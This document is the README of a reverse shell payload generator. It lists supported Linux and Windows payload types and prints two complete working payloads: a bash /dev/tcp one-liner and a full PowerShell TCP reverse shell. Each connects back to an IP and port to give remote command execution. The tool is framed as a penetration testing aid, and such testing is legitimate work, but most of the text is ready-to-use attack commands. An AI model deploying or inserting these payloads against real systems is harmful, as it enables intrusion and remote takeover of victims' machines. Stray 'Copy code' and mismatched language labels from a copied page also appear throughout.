# YSCodeShellCraft


====================================
Reverse Shell Payload Generator Help
This tool generates reverse shell payloads for Linux and Windows systems. Reverse shells allow a remote user to gain control of a target system by creating a connection from the target system to the remote user's machine. This can be useful for penetration testing or other security-related tasks.

Usage:
To use the tool, simply run the script in a terminal window:

Copy code
python3 YSCodeShellCraft.py 
You will be prompted to select a language for the payload (either "linux" or "windows"), and then enter an IP address and port number to connect to.

Payloads:
The tool supports the following reverse shell payload types:

Linux:

bash
perl
python
php
ruby
netcat
socat
nodejs
Windows:

powershell
windows_python
windows_ruby
windows_nodejs
Examples:
To generate a bash reverse shell payload for Linux, enter the following command:

yaml
Copy code
python3 YSCodeShellCraft.py
Enter the language for the reverse shell payload: linux
Enter IP address: 192.168.1.100
Enter Port number: 4444

Linux Reverse Shell Payload:
bash -i >& /dev/tcp/192.168.1.100/4444 0>&1
To generate a powershell reverse shell payload for Windows, enter the following command:

perl
Copy code
python YSCodeShellCraft.py
Enter the language for the reverse shell payload: windows
Enter IP address: 192.168.1.100
Enter Port number: 4444

Windows Reverse Shell Payload:
powershell -NoP -C "$client = New-Object System.Net.Sockets.TCPClient('192.168.1.100',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}; $client.Close()"
If you need further assistance or have any questions, please consult the documentation or contact the developer.
